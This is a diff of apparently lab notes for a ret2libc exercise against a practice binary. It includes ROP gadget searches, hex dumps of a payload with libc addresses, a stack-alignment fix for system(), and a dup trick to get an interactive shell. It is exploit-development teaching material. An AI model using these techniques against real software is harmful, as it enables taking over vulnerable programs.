@@ -64,7 +64,7 @@ https://sourceware.org/git/?p=glibc.git
 https://sourceware.org/git/?p=glibc.git;a=tree;f=csu
 The function was originally in elf-init.c, but current glibc doesn't have that file:
 
-So semi-rip the function (see extra.s) and compiling version closer to what the instructors intended: ret2libc2.c, Makefile
+So semi-rip the function (extra.s) and compile it in (Makefile).
 
 ropsearch "pop rdi"
 find "/bin/sh"
@@ -81,16 +81,16 @@ xxd -g 8 -e payload.bin
 00000080: bbbbbbbbbbbbbbbb 00005555555551eb  .........QUUUU..
 00000090: 00007ffff7dd8678 00007ffff7c50d70  x.......p.......
 
-./rlibc2 < payload.bin
+./rlibc < payload.bin
 Segmentation fault (core dumped)
 
 Under GDB, fault is at:
 0x7ffff7c50973 <do_system+115>:	movaps XMMWORD PTR [rsp],xmm1
 
-Brilliant question+answer by shaqed:
+Thanks to brilliant Q&A by shaqed, we learn this an alignment issue:
 https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul
 
-To bump RSP by 8, we can add a nop gadget, and bounce to a ret, the one after pop rdi.
+To bump RSP by 8, to align, we can add a nop gadget, and bounce to a ret, the one after pop rdi.
 
 00005555555551ec "ret"
 00005555555551eb "pop rdi; ret"
@@ -106,38 +106,41 @@ $ xxd -g 8 -e ./payload.bin
 00000090: 00005555555551eb 00007ffff7dd8678  .QUUU...x.......
 000000a0: 00007ffff7c50d70 00007ffff7c455f0  p........U......
 
-./rlibc2 < payload.bin
+./rlibc < payload.bin
 (nothing, exit() called?)
 
 I think the forked process that executes "/bin/sh" inherits stdin, which comes from file and is closed, thus we can't interact with the shell.
 
-Modify the source, instead of:
-read(0, buf, 256);
-read(99, buf, 256);
+dup(1, 0) will close 0 if open (it's currently open to payload.bin) and make it describe the file 1 describes.
+Since 1 describes the same pts as 0 upon startup (see test-fds.c), this restores its connection.
 
-And invoke by redirecting descriptor 99:
+See gen-payload.sh for commented payload generation.
 
-./rlibc2 99<payload.bin
-$ env | grep SHELL
-SHELL=/bin/bash
+./rlibc < payload.bin
+$ whoami
+andrewl
+$ ls
+extra.o  Makefile     gen-payload.sh	      README.txt  ret2libc.o  test-fds.c
+extra.s  payload.bin  peda-session-rlibc.txt  ret2libc.c  rlibc
 
 ======== EXPLOIT DOESN'T WORK ========
 
 Ensure the overflow is aligned, RBP should get bb's:
 
-GDB post-mortem:
-./rlibc2 < payload.bin
+=== GDB post-mortem:
+./rlibc < payload.bin
 Segmentation fault (core dumped)
-gdb ./rlibc2 $(ls -dtr /var/lib/apport/coredump/* | tail -n 1
+gdb ./rlibc $(ls -dtr /var/lib/apport/coredump/* | tail -n 1
 (gdb) info r
 ...
 rbp            0xbbbbbbbbbbbbbbbb  0xbbbbbbbbbbbbbbbb
 
-GDB with redirection:
-(gdb) run ./rlibc2 < ./payload.bin
+=== GDB with redirection:
+gdb rlibc
+(gdb) run rlibc < payload.bin
 
-strace with redirection:
-strace sh -c "./rlibc2 < payload.bin"
+=== strace with redirection:
+strace sh -c "./rlibc < payload.bin"
 
 ======== PWNTOOLS ========
 
